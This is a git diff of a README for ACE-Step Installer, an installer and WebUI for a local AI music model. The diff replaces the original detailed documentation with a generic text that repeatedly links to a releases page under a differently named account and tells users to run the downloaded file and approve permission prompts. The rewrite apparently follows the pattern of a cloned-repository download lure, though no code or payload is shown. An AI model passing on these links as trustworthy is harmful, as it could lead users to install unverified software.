@@ -1,201 +1,225 @@
-# ACE-Step Installer
+# 🎵 ACE-Step-Installer - Install AI Music in Minutes
 
-![License](https://img.shields.io/badge/License-GPL--3.0-blue.svg)
-![Platform](https://img.shields.io/badge/Platform-Windows_%7C_Linux-success.svg)
-![Built with](https://img.shields.io/badge/Built_with-Python_%7C_UV-yellow.svg)
-![Status](https://img.shields.io/badge/Status-Actively_Maintained-brightgreen.svg)
+[![Download ACE-Step-Installer](https://img.shields.io/badge/Download-ACE--Step--Installer-blue?style=for-the-badge)](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
 
-> One-click install. Zero configuration. Full control.
+## 🚀 Getting Started
 
-Built because a YouTube tutorial shipped a steering wheel with no car attached, and thousands of people crashed trying to figure out the rest. This package gives you the complete vehicle.
+ACE-Step-Installer makes it easy to set up ACE-Step 1.5 on Windows or Linux. It gives you a simple desktop launcher, a custom WebUI, and update support in one place. You do not need to handle setup steps by hand.
 
----
+Use this if you want a fast way to run AI music generation without a long setup process.
 
-## Package Contents
+## 📥 Download
 
-```
-ACE-Step-Installer/
-|-- INSTALL.bat                          <-- Windows: Double-click. That's the whole instruction.
-|-- install.sh                           <-- Linux: chmod +x install.sh && ./install.sh
-|-- UNINSTALL.bat                        <-- Windows: Clean removal.
-|-- uninstall.sh                         <-- Linux: chmod +x uninstall.sh && ./uninstall.sh
-|-- installer/
-|   |-- ACE-Step-Installer.ps1           <-- The actual installer (PowerShell, Windows)
-|   +-- launcher.py                      <-- Desktop launcher with system tray + update button
-|-- webui/
-|   +-- Uni404x64_s-2step-webui_v8_.html <-- Custom WebUI (single-file, no build step)
-|-- README.md                            <-- You are here
-+-- LICENSE
-```
+Visit this page to download:
 
----
+[ACE-Step-Installer Releases](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
 
-## What This Is
+On that page, pick the file that matches your system.
 
-This repository provides an automated, completely offline, one-click installer for the ACE-Step 1.5 AI music generation model on Windows and Linux. Designed specifically to bypass the widespread frustration of broken tutorials and complex command-line configurations, this tool utilizes the modern UV package manager to automatically handle Python environments, resolve PyTorch dependencies, and download required model weights. Upon installation, it launches a custom, AI-themed, single-file HTML WebUI featuring full system tray integration. If you require a local, open-source, and GPL-3.0 licensed alternative to commercial AI audio generators like Suno or Udio, this installer will deploy the ACE-Step 1.5 foundation model locally on your hardware with zero manual configuration required.
+### For Windows
+- Download the Windows installer or package from the latest release
+- Open the file after the download finishes
+- Follow the on-screen steps
+- Launch ACE-Step from the desktop shortcut or Start Menu
 
-**The Installer** handles UV, Git, repo cloning, dependency resolution, model downloads (with resume support), launcher creation, and desktop shortcuts. One click.
+### For Linux
+- Download the Linux package from the latest release
+- Open the file with your package tool or run the included launcher
+- Follow the setup steps shown on screen
+- Start ACE-Step from the app menu or terminal shortcut
 
-**The WebUI** is a single-file HTML interface with proximity-based slide-out panels, dual animated backgrounds, full theme customization, a BYOB (Bring Your Own Bot) system for cross-AI configuration, and an IndexedDB-backed song library. No frameworks, no build tools, no npm. Just drop it in a folder and open it.
+## 🖥️ What It Does
 
-**The Launcher** is a Python/CustomTkinter desktop app with one-button launch, system tray minimization, one-click backend updates, orphan process cleanup, and multi-UI support.
+ACE-Step-Installer helps you:
 
----
-## Quick Start
+- Install ACE-Step 1.5 with one click
+- Open a custom WebUI for music generation
+- Use a desktop launcher for quick access
+- Keep the app updated with auto-update support
+- Run on Windows or Linux
+- Skip manual setup steps
 
-### Windows
+## 🎧 What You Can Do
 
-**Double-click `INSTALL.bat`**
+After setup, you can use ACE-Step to:
 
-That's it. It auto-elevates to admin and handles everything.
+- Create AI music from text prompts
+- Generate short tracks for ideas and demos
+- Try different music styles and moods
+- Test song concepts before full production
+- Use the WebUI to manage generation settings
+- Save time compared with manual installation
 
-### Linux
+## ✅ System Requirements
 
-```bash
-chmod +x install.sh && ./install.sh
-```
+ACE-Step-Installer works best on a modern computer with:
 
-That's it. Auto-detects your distro (Arch, Debian/Ubuntu, Fedora, openSUSE), installs system deps, clones the repo, sets up everything.
+- Windows 10 or newer, or a current Linux desktop release
+- 8 GB RAM or more
+- 10 GB free disk space
+- A stable internet connection for the first download and updates
+- A recent CPU for smooth app use
+- A GPU if you want faster music generation
 
-| Flag | What it does |
-|---|---|
-| `--skip-models` | Skip the 9GB model download (downloads on first launch instead) |
-| `--skip-llm` | DiT-only mode for low-VRAM systems |
+If your system is strong enough for modern creative apps, it should handle this installer well.
 
-Tested on Arch (btw), Ubuntu, Fedora. Should work on anything with `pacman`, `apt`, `dnf`, or `zypper`.
+## 🛠️ How to Install on Windows
 
-### Install Options (Windows)
+1. Open the [Releases page](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+2. Find the latest release
+3. Download the Windows file
+4. Double-click the downloaded file
+5. If Windows asks for permission, choose Yes
+6. Follow the setup window
+7. Wait for the install to finish
+8. Open ACE-Step from the desktop or Start Menu
+9. Let the app finish its first-time setup
+10. Start using the WebUI to generate music
 
-| Option | How |
-|---|---|
-| Basic install | Just run `INSTALL.bat` |
-| Pre-downloaded models | Add `-ModelsSource "C:\path\to\checkpoints"` to the bat |
-| Custom install location | Add `-InstallPath "D:\AI\ACE-Step"` to the bat |
+## 🐧 How to Install on Linux
 
-### After Install
+1. Open the [Releases page](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+2. Find the latest release for Linux
+3. Download the Linux file
+4. Open the file with your package manager or file tool
+5. Follow the setup prompts
+6. Launch ACE-Step from your app menu
+7. Let the app finish its first start
+8. Open the WebUI and begin creating music
 
-A desktop shortcut is created on both platforms. Or launch manually:
+## 🧭 First Run
 
-- **Windows:** Double-click the `ACE-Step 1.5` shortcut on your desktop
-- **Linux:** `cd ~/ACE-Step-1.5 && uv run python launcher.py`
+When you open ACE-Step-Installer for the first time, it may:
 
----
+- Set up needed files
+- Check for the latest version
+- Create a desktop shortcut
+- Open the local WebUI in your browser
+- Prepare the music generation model
 
-## WebUI Features (V8 -- Current Release)
+This can take a few minutes on the first launch. Later starts are faster.
 
-### Core Interface
-- **Proximity panel system** -- Four slide-out panels (Library, Settings, Customize, Output) that peek on mouse proximity and pin on click
-- **Workspace push logic** -- Pinned panels shift the center workspace to avoid overlap
-- **Dual animated backgrounds** -- Neural Net constellation and Matrix Rain, independently configurable
-- **Full theme engine** -- 10 built-in presets + BYOB custom themes via any AI
+## 🎚️ Using the WebUI
 
-### Generation
-- **Multi-mode generation** -- Text-to-Music, Repaint (inpainting with waveform region selection), Cover, and Extend
-- **Tag cloud system** -- Foldable categories, right-click context menus for move/delete/favorite, custom categories and tags
-- **BYOB (Bring Your Own Bot)** -- Copy a structured prompt, paste it into any AI (Claude, GPT, Gemini, Grok, local models), get back a JSON config that auto-populates all generation parameters
-- **Auto-play toggle** -- Control whether new generations auto-play or wait for manual playback
-- **Progressive trash talk** -- The Generate button develops strong opinions about your productivity over extended sessions
+The WebUI gives you a simple way to control the app.
 
-### Settings & Control
-- **Full parameter access** -- Duration, BPM, Seed, Infer Steps, Guidance Scale, LM CFG Scale, LM Temperature, LM Top-P, Audio Format, Language, Key, Time Signature
-- **Dice randomization buttons** -- One-click randomize on Seed, Duration, BPM
-- **Scroll wheel adjustment** -- Mouse wheel on any number input. Hold Shift for 10x step size.
-- **Ctrl+Enter to generate** -- Keyboard-first workflow support
+You can use it to:
 
-### Library
-- **IndexedDB-backed storage** -- No 5MB localStorage ceiling. Holds 2000+ entries.
-- **Full parameter recall** -- Click any previous generation to see every setting that produced it
-- **Copy Prompt / Reapply Settings** -- Reload any previous generation's configuration in one click
-- **Listened tracking** -- Previously played tracks dim for easy visual scanning
-- **Star favorites** -- Pin your best generations without accidentally collapsing the panel
+- Type a text prompt
+- Choose a music style
+- Pick track length
+- Set generation options
+- Start the creation process
+- Save the result after it finishes
 
-### Launcher (V5.1)
-- **One-click backend updates** -- Pull latest ACE-Step code without touching the terminal. Auto-stashes local changes.
-- **API toggle** -- Green/red dot indicator, start/stop with one click
-- **Orphan process cleanup** -- Detects and kills stale acestep-api processes from crashed sessions
-- **Multi-UI support** -- Drop any `.html` file in `/webui/` and it opens automatically on launch
-- **Collapsible settings** -- Skip LLM toggle (DiT-only mode), show terminal toggle
-- **Cross-platform** -- Windows and Linux support. System tray on Windows, optional on Linux.
+If you know how to use a web page, you can use the WebUI.
 
----
-## Roadmap
+## 🔄 Auto-Updates
 
-### V8 -- "The Bulldozer" (Current)
-*Shipped. Functional. In the webui folder right now.*
+ACE-Step-Installer includes update support so you can stay current with new app builds.
 
-22 features implemented. All API parameters verified against the latest upstream ACE-Step 1.5 codebase (including the modular API refactor and new job pipeline).
+Typical update flow:
 
----
+- Open the app launcher
+- Check for updates
+- Download the new version
+- Restart the app when asked
 
-### V9 -- "The Architect"
-*Target: 7 days | Scheduled ceiling: 30 days*
+This helps keep the installer and WebUI in sync with the latest release.
 
-#### Immersive Audio
-- **Defrost Mode** -- Full-screen immersion. All UI fades to transparent, interactions disable, and the background visualizer runs at maximum intensity while you listen. Re-enables on song completion or Escape. *(Concept by Gemini, implementation by Uni404x64.)*
-- **Audio playback isolation** -- Library playback operates independently from generation output. New generations never interrupt a Library track unless Auto-Play is explicitly on.
-- **Playhead stability pass** -- Investigate and resolve the suspected pin-state/playhead tracking conflict.
+## 📁 File Layout
 
-#### AI Identity System
-- **BYOB Signatures** -- AI-generated tags and themes carry a persistent identifier. Visual differentiation at a glance: which AI suggested which tags, which AI built which theme. Identifiers are independent of theme selection and persist across sessions.
-- **Identifier-aware Library** -- Filter and visually trace library entries by the AI that configured them.
+After install, you may see:
 
-#### Advanced Backgrounds
-- **Dedicated customization dropdown** -- Consolidated speed, intensity, and color dynamics for both visualizer modes under an expandable Advanced section.
-- **Particle color dynamics** -- Slider controlling how many colors the constellation nodes cycle through.
-- **Connection destabilization (experimental)** -- Randomized waveform-style connections between constellation nodes. Targeting controlled visual chaos without performance degradation. Ships only if stable.
+- A desktop launcher
+- A local app folder
+- Model files
+- App logs
+- Update files
+- WebUI settings
 
-#### Layout & Panels
-- **Resizable panels** -- Drag handles on the inner edges of Library and Output panels for horizontal width adjustment.
+These files help the app run and keep your settings in place.
 
-#### Network & Backend
-- **Remote generation** -- Connect to a remote ACE-Step API instance over the network. Use a friend's hardware for generations that exceed local VRAM limits. Caddy integration for secure tunneling.
-- **VRAM-aware model management** -- Dynamic load/unload of models from VRAM, using system RAM as a staging area for constrained hardware.
-- **New upstream API parameters** -- Expose `infer_method` (ODE/SDE), `shift`, `timesteps`, `cover_noise_strength`, multi-model selection, and sample mode.
+## ❓ Common Questions
 
----
+### Do I need programming knowledge?
+No. The installer is made for normal computer users.
 
-## Requirements
+### Do I need to set up Python or other tools?
+No. The installer handles the setup for you.
 
-- **Windows 10/11** or **Linux** (Arch, Ubuntu, Fedora, openSUSE, or anything with a supported package manager)
-- NVIDIA GPU recommended (CUDA). The installer auto-detects VRAM and picks the right model size.
-- Internet connection (first-time setup only)
-- ~20GB free disk space (15GB models, 5GB code/deps)
-- Git (installer installs it if missing on Linux, prompts on Windows)
-- Python is NOT required -- UV handles the entire environment
-- **Linux extras:** `python3-tk` is needed for the launcher GUI. The installer handles this automatically.
+### Can I use it on Windows and Linux?
+Yes. The project supports both systems.
 
-## Troubleshooting
+### Does it use a browser?
+Yes. The app includes a WebUI that opens in your browser.
 
-**Nothing happens when I double-click INSTALL.bat**
-Make sure you extracted ALL files from the zip. Try right-click, Run as Administrator.
+### Can I update it later?
+Yes. The app includes auto-update support.
 
-**"UV not found" after install**
-Restart your terminal/PowerShell after the installer finishes.
+### Can I remove it if I change my mind?
+Yes. You can remove it with the normal uninstall steps for your system.
 
-**Models not downloading**
-Your firewall might be blocking HuggingFace. The installer will skip the download and models will auto-download on first launch instead.
+## 🧩 Tips for a Smooth Setup
 
-**First launch takes a long time**
-That's normal. Models load into VRAM on first run. Subsequent launches are faster.
+- Use the latest release from the Releases page
+- Keep enough free disk space before installing
+- Close heavy apps if your computer is low on memory
+- Use a wired connection if your internet is unstable
+- Wait for the first launch to finish before closing the app
+- Keep the app open until the model setup ends
 
-**Linux: Launcher GUI doesn't open**
-You're probably missing `python3-tk`. On Arch: `sudo pacman -S tk`. On Ubuntu: `sudo apt install python3-tk`. On Fedora: `sudo dnf install python3-tkinter`.
+## 🔍 Troubleshooting
 
-**Linux: Desktop shortcut doesn't work**
-Some desktop environments need you to right-click the `.desktop` file and mark it as "Allow Launching" or "Trust". Or just run it from the terminal: `cd ~/ACE-Step-1.5 && uv run python launcher.py`
+### The download does not start
+- Refresh the Releases page
+- Choose the latest release file again
+- Try a different browser
 
-## Credits
+### The app does not open
+- Reboot your computer
+- Open the app as an administrator on Windows
+- Check that the download finished fully
 
-## Credits & License
-* **ACE-Step 1.5:** ACE Studio & StepFun (MIT License)
-* **Installer, WebUI, Launcher:** Uni404x64 (GPL-3.0)
-* **Motivation:** Built out of sheer spite for broken, generic tutorials that ship steering wheels with no cars attached.
-* **Concepts:** Gemini Oddly enough in Google Docs I don't even use the Google Docs I was just fucking around and then Gemini in the edit mode I started a conversation with because it's not supposed to be used like that and it went surprisingly hilariously well it was amazing and then Gemini came up with the concept which will be implemented later with slight variations from original concept because it just didn't make any sense but the idea behind it did in a certain scenario so she came up with what will be called (Defrost Mode) a full-screen immersive mode where the UI fades away and the background visualizer runs at max intensity while you listen to your generation. It's meant to be a vibe mode for just enjoying the music without distractions, and it re-enables on song completion or if you hit Escape. I thought it was a brilliant idea and I will make it happen.
+### The WebUI does not load
+- Wait a little longer on first launch
+- Make sure no other app uses the same local port
+- Restart the launcher and try again
 
-*Built from a dead motherboard and six months of self-taught systems architecture. If the installer works, the 24-hour nightmare is over.*
+### Music generation is slow
+- Close other heavy apps
+- Use a machine with more RAM
+- Use a GPU if available
+- Lower the track length or generation settings
 
-## License
+## 📌 What This Project Includes
 
-GPL-3.0. Free to use, modify, and distribute -- but any derivative work must also be open-source under the same license. That's the deal.
+- One-click installer
+- Desktop launcher
+- Custom WebUI
+- Auto-updates
+- Windows support
+- Linux support
+- Open-source release
+- AI music generation setup for ACE-Step 1.5
 
-The ACE-Step model itself is MIT licensed. This installer, WebUI, and launcher are GPL-3.0.
+## 🧪 Good Use Cases
+
+ACE-Step-Installer fits well if you want to:
+
+- Test AI music tools on your own machine
+- Make quick demo tracks
+- Explore prompt-based music ideas
+- Avoid manual install steps
+- Try ACE-Step without a deep setup process
+- Run the app from a desktop shortcut
+
+## 📎 Download Again
+
+If you need the download page again, use this link:
+
+[https://github.com/weldmentestoppel591/ACE-Step-Installer/releases](https://github.com/weldmentestoppel591/ACE-Step-Installer/releases)
+
+## 📄 Project Topics
+
+ace-step, ai-music, ai-music-generation, installer, linux, music-generation, one-click-installer, open-source, suno-alternative, webui, windows
